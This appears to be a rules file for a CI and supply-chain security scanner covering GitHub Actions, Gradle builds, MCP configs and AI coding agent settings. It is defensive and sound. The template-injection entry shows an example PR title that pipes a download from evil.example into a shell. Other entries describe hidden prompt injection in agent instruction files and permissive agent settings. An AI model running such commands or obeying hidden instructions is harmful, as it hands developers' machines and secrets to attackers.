rules.title: Action is pinned to a tag or branch, not a commit SHA
rules.why: A tag or branch is a label the action's owner can move to different code. In the tj-actions and Trivy attacks, moved tags ran stolen-secret code inside thousands of workflows that never changed a line. GitHub-owned and same-organization actions are reported one level lower; this repository's own code goes to notes.
rules.fix: Replace the tag with the full 40-character commit SHA and keep the version in a trailing comment. Let a tool such as `pinact run` write the pin, and let Dependabot (with a cooldown) keep it current. Reference this repository's own actions as `./…` or `$/…`.
rules.verify: Run `pinact run --check` or zizmor's `unpinned-uses` audit: every remote `uses:` in workflows and composite `action.yml` files should end in a 40-character SHA.

rules.title: Workflow token permissions are not restricted
rules.why: Every run gets a GITHUB_TOKEN. Without a `permissions:` block it gets the repository default, which is read-write on many older organizations, so any hijacked step can push code or change releases.
rules.fix: Add `permissions: {}` at the top of the workflow so the token can do nothing, then grant each job only what it needs. Never use `write-all`.
rules.verify: Open a run's "Set up job" log and check the GITHUB_TOKEN permissions list matches what the job needs.

fix_code.code:
permissions: {}          # workflow level: deny everything
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read     # job level: only what this job needs

rules.title: pull_request_target workflow checks out the pull request's code
rules.why: `pull_request_target` runs with your secrets and a write token even for pull requests from forks. Checking out and building the fork's code hands both to whoever opened the pull request, as happened to Ultralytics, Nx, and TanStack. A job that keeps forks out is reported as high, or medium when no later step runs the checked-out code.
rules.fix: Use `pull_request` for anything that builds or tests contributed code. If you need `pull_request_target`, never check out or run the fork's code in that job, and never let it write a cache or artifact another workflow uses.
rules.verify: Search the workflow for `pull_request_target` and confirm no job in it checks out `github.event.pull_request.head.*` or runs `gh pr checkout`.

fix_code.code:
on:
  pull_request:          # fork code runs with a read-only token and no secrets

permissions: {}
jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - run: ./gradlew assembleDebug

rules.title: Untrusted event text is pasted into a run script
rules.why: GitHub replaces `${{ }}` before the shell runs, so a pull request title, issue body, or branch name becomes part of your script. A title such as `x"; curl evil | sh` then runs as your workflow, with its token and secrets. Free-text dispatch inputs, which only writers can set, are reported as medium.
rules.fix: Pass the value through `env:` and read it as a quoted shell variable, so it stays data.
rules.verify: Run zizmor (`template-injection` audit) or actionlint; no `run:` block should expand attacker-controlled fields (titles, bodies, branch names, commit messages, `github.head_ref`) directly.

fix_code.code:
# Wrong: a PR titled   x"; curl -s https://evil.example | sh; echo "   runs as your script
- run: echo "Checking ${{ github.event.pull_request.title }}"

# Right: pass it as data through the environment, and quote it
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $PR_TITLE"

rules.title: actions/checkout leaves the job token on disk
rules.why: By default `actions/checkout` leaves the job token in the workspace's git config (from v6, in a credentials file under `$RUNNER_TEMP` that `.git/config` includes). Every later step, including third-party actions and build scripts, can read it, and with older versions an uploaded artifact of the workspace can leak it.
rules.fix: Set `persist-credentials: false` on every checkout. Only a job that pushes back to the repository needs the token: set `persist-credentials: true` there on purpose, or pass the token to that one command.
rules.verify: In a test run, add a step `git config --get-regexp 'http.*extraheader'`; it should print nothing. zizmor's `artipacked` audit also flags checkouts that keep credentials.

fix_code.code:
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  with:
    persist-credentials: false   # don't leave the token on disk for later steps

rules.title: Signing key or signing password is committed to the repository
rules.why: Anyone who can read the repository, or any of its forks and clones, can sign builds as you. Deleting the file later doesn't help: it stays in git history. Nightly or QA keys are reported as high, and debug keystores go to notes. A keystore whose password stays out of the repository is reported one level lower.
rules.fix: Rotate first: request an upload key reset in Play Console, or revoke the certificate or API key. Then remove the file from history, store the keystore base64-encoded in the CI secret store, decode it at build time, and read passwords from environment variables.
rules.verify: Run `git log --all -- '*.jks' '*.keystore' '*.p12' '*.p8' key.properties` and confirm nothing comes back after the history rewrite.

rules.title: Gradle wrapper download is not checked against a SHA-256
rules.why: Without `distributionSha256Sum`, the wrapper runs whatever Gradle distribution the download URL returns. A swapped distribution runs with full access to your build and its signing secrets.
rules.fix: Add `distributionSha256Sum` to `gradle/wrapper/gradle-wrapper.properties`, using the checksum published for that exact Gradle version. `./gradlew wrapper --gradle-version <v> --gradle-distribution-sha256-sum <sha>` writes it for you.
rules.verify: Change one character of the checksum and run `./gradlew help` on a clean machine: the download should fail verification.

fix_code.code:
# gradle/wrapper/gradle-wrapper.properties
distributionUrl=https\://services.gradle.org/distributions/gradle-<version>-bin.zip
distributionSha256Sum=<SHA-256 published at gradle.org/release-checksums for that file>

rules.title: No dependency lockfile is committed
rules.why: Without a lockfile, the same build file can resolve a different dependency version next month, including a malicious one, and nobody notices because no file changed.
rules.fix: Enable Gradle dependency locking and commit each module's `gradle.lockfile`, or commit `gradle/verification-metadata.xml` with `<verify-metadata>true</verify-metadata>`. For Swift packages, commit `Package.resolved`; libraries others depend on may leave it out on purpose.
rules.verify: Run `./gradlew dependencies --write-locks`, commit the result, and confirm a later build fails if a resolved version changes.

rules.title: MCP server runs a package or image that isn't pinned
rules.why: An MCP server in a committed config starts on every developer's machine that opens the repository with an AI coding agent. `npx -y name` or `uvx name` fetches whatever version is newest at that moment, so one malicious release runs with the developer's files, keys, and tokens.
rules.fix: Pin each server to an exact version (`name@1.2.3` for npx, `name==1.2.3` for uvx) or a Docker image digest, and update it on purpose, the way you update a dependency.
rules.verify: Open the MCP config: every `npx`, `uvx`, `pipx run`, and `docker run` entry names an exact version or an `@sha256:` digest.

rules.title: Secret is written into a committed MCP server config
rules.why: An MCP config is committed with the code, so a token in its `env`, `headers`, arguments, or URL is readable by everyone with access to the repository and stays in its history after it's removed.
rules.fix: Revoke the token, then read it from the environment instead: `"${GITHUB_TOKEN}"` in .mcp.json, `"${env:GITHUB_TOKEN}"` or an `inputs` prompt in VS Code. Remove the old value from the history if the repository is public.
rules.verify: Search the MCP configs for literal values in `env` and `headers`: each one should be a `${...}` reference, and the old token should no longer work.

rules.title: Agent instruction file holds text a reviewer can't see
rules.why: AI coding agents read AGENTS.md, CLAUDE.md, Cursor rules, and similar files as instructions. Unicode tag characters, long zero-width runs, and bidirectional controls are invisible in an editor and on GitHub, but the model reads them, so a pull request can add instructions no reviewer saw.
rules.fix: Delete the hidden characters (the finding shows what the tag characters spell), find out who added them, and add a CI check that rejects these characters in agent instruction files.
rules.verify: Run `grep -nP '[\x{E0000}-\x{E007F}\x{200B}\x{2060}\x{202A}-\x{202E}\x{2066}-\x{2069}]'` on the file: it prints nothing.

rules.title: Agent instruction file has a hidden comment that gives orders
rules.why: HTML comments and `[//]: #` lines don't show on GitHub or in a Markdown preview, but an AI agent reads them. A hidden comment telling the agent to run a download, keep something from the user, or send secrets somewhere is a prompt injection a reviewer won't notice.
rules.fix: Read the comment. If nobody on the team wrote it on purpose, remove it and check what the agent did in this repository since it was added. Put real instructions in visible text.
rules.verify: Render the file and compare it with the raw text: every instruction the agent gets is visible to a reviewer.

rules.title: Committed agent settings let it run commands without asking
rules.why: Settings in .claude/settings.json or .codex/config.toml apply to everyone who opens the repository. `bypassPermissions`, an unrestricted `Bash` allow rule, Codex's `danger-full-access` or `approval_policy = "never"`, or auto-starting every project MCP server mean a prompt injection in any file the agent reads can run commands on a developer's machine.
rules.fix: Remove the setting from the committed file. Allow specific commands instead (`Bash(./gradlew test)`), and leave broader choices to each developer's own settings.local.json, which isn't committed.
rules.verify: Open the agent in the repository and ask it to run a command the allow list doesn't name: it asks first.

rules.title: Committed agent hook downloads and runs code
rules.why: Hooks in .claude/settings.json run as shell commands on each developer's machine whenever the agent starts or uses a tool. A hook that pipes a download into a shell, or starts an unpinned package, runs whatever that server returns, with the developer's access.
rules.fix: Commit the hook's script into the repository and run that file, or pin the tool to an exact version. Never pipe a download into a shell from a hook.
rules.verify: Read each `command` in the hooks block: it runs a file in the repository or a pinned tool, and fetches nothing to execute.
